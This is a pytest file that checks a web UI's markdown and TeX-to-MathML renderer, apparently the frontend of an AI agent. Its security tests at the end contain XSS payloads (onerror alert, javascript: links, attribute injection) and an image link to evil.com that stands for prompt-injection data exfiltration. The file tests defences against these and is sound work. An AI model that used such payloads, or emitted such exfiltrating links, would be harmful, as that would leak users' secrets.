"""web/markdown.js 的渲染测试：用 node 跑前端文件，在 Python 里断言输出。

前端零构建、不引入 npm，所以测试也不装任何 JS 包；机器上没有 node 就整体跳过。
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

import simpleagent.web

NODE = shutil.which("node")
WEB = Path(simpleagent.web.__file__).parent

pytestmark = pytest.mark.skipif(NODE is None, reason="需要 node 来跑前端 JS")


def _run(script: str, func: str, *args: object) -> str:
    js = (
        f"const {{ {func} }} = require({json.dumps(str(WEB / script))});"
        "const args = JSON.parse(require('fs').readFileSync(0, 'utf8'));"
        f"process.stdout.write(JSON.stringify({func}(...args)));"
    )
    out = subprocess.run(
        [NODE, "-e", js],
        input=json.dumps(args),
        capture_output=True,
        text=True,
        check=True,
        timeout=10,
    )
    return json.loads(out.stdout)


def md(src: str) -> str:
    return _run("markdown.js", "renderMarkdown", src)


def tex(src: str, display: bool = False) -> str:
    """math.js 的 TeX → MathML，不带外面的 <math> 标签"""
    html = _run("math.js", "texToMathML", src, display)
    return (
        html.removeprefix('<math display="block">').removeprefix("<math>").removesuffix("</math>")
    )


# --------------------------------------------------------------- 块级
def test_heading_and_paragraphs():
    # 段落里的单个换行是 <br>，空行分段
    assert md("## 标题\n第一行\n第二行\n\n第二段") == (
        "<h2>标题</h2><p>第一行<br>第二行</p><p>第二段</p>"
    )


def test_nested_list_is_tight():
    assert md("- a\n  - b\n    - c\n- d") == (
        "<ul><li>a<ul><li>b<ul><li>c</li></ul></li></ul></li><li>d</li></ul>"
    )


def test_loose_list_wraps_paragraphs():
    assert md("- a\n\n- b") == "<ul><li><p>a</p></li><li><p>b</p></li></ul>"


def test_ordered_list_start_and_code_inside_item():
    assert md("3. x\n4. y") == '<ol start="3"><li>x</li><li>y</li></ol>'
    assert md("1. 安装\n   ```bash\n   uv sync\n   ```\n2. 运行") == (
        '<ol><li>安装<pre class="code"><code>uv sync</code></pre></li><li>运行</li></ol>'
    )


def test_list_interrupts_paragraph():
    # 模型常写「步骤：」紧跟列表、中间不空行
    assert md("步骤：\n1. a\n2. b") == "<p>步骤：</p><ol><li>a</li><li>b</li></ol>"


def test_task_list():
    html = md("- [x] 完成\n- [ ] 待办")
    assert html.count('class="task-box"') == 2
    assert html.count("checked") == 1


def test_table_alignment_and_cells():
    html = md("| 名称 | 数量 |\n|:--|--:|\n| `a | b` | 2 |\n| c |")
    assert '<th style="text-align:left">名称</th>' in html
    assert '<td style="text-align:right">2</td>' in html
    assert "<code>a | b</code>" in html  # 行内代码里的 | 不拆列
    assert html.count("<td") == 4  # 缺的单元格按表头补齐


def test_table_needs_matching_separator():
    # 分隔行列数对不上就不是表格
    assert "<table>" not in md("a | b\n| --- |")


def test_blockquote_and_hr():
    assert md("> 引用\n>> 嵌套") == (
        "<blockquote><p>引用</p><blockquote><p>嵌套</p></blockquote></blockquote>"
    )
    assert md("a\n\n---\n\nb") == "<p>a</p><hr><p>b</p>"
    assert md("* * *") == "<hr>"


def test_fenced_code_escapes_and_unclosed_runs_to_end():
    assert md('```py\nx = "<b>"\n```') == (
        '<pre class="code"><code>x = &quot;&lt;b&gt;&quot;</code></pre>'
    )
    # 流式输出时围栏还没闭合：直接按代码块渲染到末尾，不先显示成普通文本
    assert md("```\nfoo **bar**\n") == '<pre class="code"><code>foo **bar**</code></pre>'


# --------------------------------------------------------------- 行内
def test_emphasis():
    assert md("**粗** *斜* _斜_ ~~删~~ ***都***") == (
        "<p><strong>粗</strong> <em>斜</em> <em>斜</em> <del>删</del> "
        "<strong><em>都</em></strong></p>"
    )


def test_no_false_emphasis():
    html = md("__init__.py 和 2 * 3 * 4 和 snake_case_name")
    assert "<em>" not in html and "<strong>" not in html


def test_code_span_and_backslash_escape_are_literal():
    assert md("`**x**` 和 ``a`b`` 和 \\*不斜\\*") == (
        "<p><code>**x**</code> 和 <code>a`b</code> 和 *不斜*</p>"
    )


def test_links():
    html = md("[文档](https://example.com/a_b?x=1&y=2)")
    assert html == (
        '<p><a href="https://example.com/a_b?x=1&amp;y=2" target="_blank" '
        'rel="noopener noreferrer">文档</a></p>'
    )
    # 链接文字里可以有行内代码
    assert "<code>code</code> 链接</a>" in md("[`code` 链接](https://a.com)")


def test_bare_url_trims_trailing_punctuation():
    html = md("见 https://example.com/x。(https://en.wikipedia.org/wiki/Foo_(bar))")
    assert 'href="https://example.com/x"' in html
    assert 'href="https://en.wikipedia.org/wiki/Foo_(bar)"' in html
    assert "</a>)</p>" in html  # 多出来的右括号留在链接外面


# --------------------------------------------------------------- 公式
def test_display_math_block():
    html = md("$$\\frac{\\Delta P}{P} \\approx -D_{mod} \\times \\Delta y$$")
    assert html.startswith('<div class="math-block"><math display="block">')
    assert '<mfrac><mrow><mi mathvariant="normal">Δ</mi><mi>P</mi></mrow><mi>P</mi></mfrac>' in html
    # ≈ 后面的负号是一元的，不留二元运算符的间距
    assert '<mo>≈</mo><mo form="prefix">−</mo>' in html
    assert "$$" not in html and "\\frac" not in html


def test_multiline_display_math_interrupts_paragraph():
    html = md("久期：\n$$\n\\frac{a}{b}\n$$\n其中 $a$ 是价格")
    assert html == (
        '<p>久期：</p><div class="math-block"><math display="block">'
        "<mfrac><mi>a</mi><mi>b</mi></mfrac></math></div>"
        "<p>其中 <math><mi>a</mi></math> 是价格</p>"
    )


def test_bracket_and_paren_delimiters():
    assert md("\\(x^2\\)") == "<p><math><msup><mi>x</mi><mn>2</mn></msup></math></p>"
    assert md("\\[\nE = mc^2\n\\]").startswith('<div class="math-block"><math display="block">')
    # 段落里夹的 $$…$$ 按行间公式显示
    assert '<math display="block">' in md("这是 $$x$$ 行内")


def test_bare_align_environment():
    html = md("\\begin{align}\na &= b \\\\\n&= c\n\\end{align}")
    assert html.startswith('<div class="math-block"><math display="block"><mtable>')
    assert html.count("<mtr>") == 2


def test_unclosed_display_math_renders_while_streaming():
    assert md("$$\n\\frac{a}{b") == (
        '<div class="math-block"><math display="block">'
        "<mfrac><mi>a</mi><mi>b</mi></mfrac></math></div>"
    )


def test_money_is_not_math():
    src = "从 $100 涨到 $120，价格是$5，折扣后$3，US$5 和 5$"
    assert md(src) == f"<p>{src}</p>"


def test_math_is_literal_in_code_and_after_backslash():
    assert md("`$x$` 和 \\$5 和 \\$x\\$") == "<p><code>$x$</code> 和 $5 和 $x$</p>"


def test_markdown_does_not_touch_math():
    # 公式里的 * _ 不能变成斜体；\{ 是 TeX 命令，不是 Markdown 转义
    html = md("$a*b*c$ 和 $x_1 + y_1$ 和 $\\{1, 2\\}$")
    assert "<em>" not in html
    assert '<mo stretchy="false">{</mo>' in html


def test_math_in_list_and_table():
    assert "<li>公式 <math>" in md("- 公式 $x$")
    html = md("| 符号 | 含义 |\n|---|---|\n| $\\sigma^2$ | 方差 |")
    assert "<td><math><msup><mi>σ</mi><mn>2</mn></msup></math></td>" in html


# --------------------------------------------------------------- TeX → MathML
def test_tex_scripts_and_fractions():
    assert tex("x_i^2") == "<msubsup><mi>x</mi><mi>i</mi><mn>2</mn></msubsup>"
    assert tex("x^23") == "<mrow><msup><mi>x</mi><mn>2</mn></msup><mn>3</mn></mrow>"
    assert tex("\\sqrt[3]{a}") == "<mroot><mi>a</mi><mn>3</mn></mroot>"
    assert tex("\\frac12") == "<mfrac><mn>1</mn><mn>2</mn></mfrac>"
    assert tex("f'(x)").startswith('<mrow><mrow><mi>f</mi><mo lspace="0" rspace="0">′</mo></mrow>')


def test_tex_big_operators_and_functions():
    # 上下限放 munderover，行内还是行间交给浏览器按 movablelimits 决定
    assert tex("\\sum_{i=1}^n").startswith('<munderover><mo movablelimits="true">∑</mo>')
    assert tex("\\int_0^1").startswith("<msubsup><mo>∫</mo>")
    assert tex("\\lim_{x\\to 0}").startswith("<munder><mo movablelimits")
    # \sin x 之间有小间距，\sin(x) 没有
    assert "<mi>sin</mi><mspace" in tex("\\sin x")
    assert "<mspace" not in tex("\\sin(x)")


def test_tex_delimiters_and_environments():
    assert tex("\\left(\\frac{a}{b}\\right)") == (
        '<mrow><mo fence="true" stretchy="true">(</mo><mfrac><mi>a</mi><mi>b</mi></mfrac>'
        '<mo fence="true" stretchy="true">)</mo></mrow>'
    )
    m = tex("\\begin{pmatrix} a & b \\\\ c & d \\end{pmatrix}")
    assert m.count("<mtr>") == 2 and m.count("<mtd>") == 4
    cases = tex("\\begin{cases} x & x > 0 \\\\ -x & \\text{otherwise} \\end{cases}")
    assert cases.startswith('<mrow><mo fence="true" stretchy="true">{</mo><mtable>')
    assert "<mtext>otherwise</mtext>" in cases
    # 没写环境的多行公式照样排成表
    assert tex("a &= b \\\\ &= c", True).startswith("<mtable>")


def test_tex_fonts_use_unicode_letters():
    # Chrome 不认 mathvariant="double-struck"，直接换成 Unicode 数学字母
    assert tex("\\mathbb{R}") == "<mi>ℝ</mi>"
    assert tex("\\mathbf{x}") == "<mi>𝐱</mi>"
    assert tex("\\mathcal{L}") == "<mi>ℒ</mi>"
    assert tex("\\boldsymbol{\\beta}") == "<mi>𝜷</mi>"
    assert tex("\\mathrm{d}x") == '<mrow><mi mathvariant="normal">d</mi><mi>x</mi></mrow>'


def test_tex_is_forgiving():
    assert tex("\\frac{a") == "<mfrac><mi>a</mi><mrow></mrow></mfrac>"
    assert tex("a}b") == "<mrow><mi>a</mi><mi>b</mi></mrow>"
    # 认不出的命令显示成红字；Object.prototype 上的名字也不能摸到
    assert tex("\\foo") == '<mtext class="math-unknown">\\foo</mtext>'
    assert tex("\\constructor") == '<mtext class="math-unknown">\\constructor</mtext>'
    # 嵌套深到爆栈就原样显示源码
    assert _run("math.js", "texToMathML", "{" * 20000, False).startswith(
        '<code class="math-error">'
    )


# --------------------------------------------------------------- 安全
def test_raw_html_is_escaped_everywhere():
    payload = "<img src=x onerror=alert(1)>"
    for src in [
        payload,
        f"# {payload}",
        f"- {payload}",
        f"> {payload}",
        f"| a |\n|---|\n| {payload} |",
        f"[{payload}](https://a.com)",
    ]:
        html = md(src)
        assert "<img" not in html, src
        assert "&lt;img" in html, src


def test_math_escapes_everything():
    for src in [
        "$<img src=x onerror=alert(1)>$",
        "$$\\text{<img src=x onerror=alert(1)>}$$",
        "$\\operatorname{<img src=x>}$",
    ]:
        html = md(src)
        assert "<img" not in html, src
        assert "&lt;" in html, src
    # 颜色、宽度这些进属性值的参数按白名单校验，不合格就丢掉
    html = md('$\\color{red" onmouseover="alert(1)}{a} \\hspace{1em" x="y}$')
    assert "onmouseover" not in html and 'x="y"' not in html
    assert '<mstyle mathcolor="red">' in md("$\\color{red}{a}$")


def test_only_http_links_are_clickable():
    html = md("[x](javascript:alert(1)) [y](./src/foo.py)")
    assert "<a" not in html and "href" not in html
    assert '<span class="link-off" title="javascript:alert(1)">x</span>' in html


def test_images_are_never_loaded():
    # prompt injection 可以让模型输出带机密参数的图片地址，渲染即外发
    html = md("![logo](https://evil.com/?q=secret)")
    assert "<img" not in html
    assert ">图片：logo</a>" in html


def test_only_br_tag_is_allowed():
    assert md("a<br>b<br/>c") == "<p>a<br>b<br>c</p>"
    assert md("<br onclick=x>") == "<p>&lt;br onclick=x&gt;</p>"
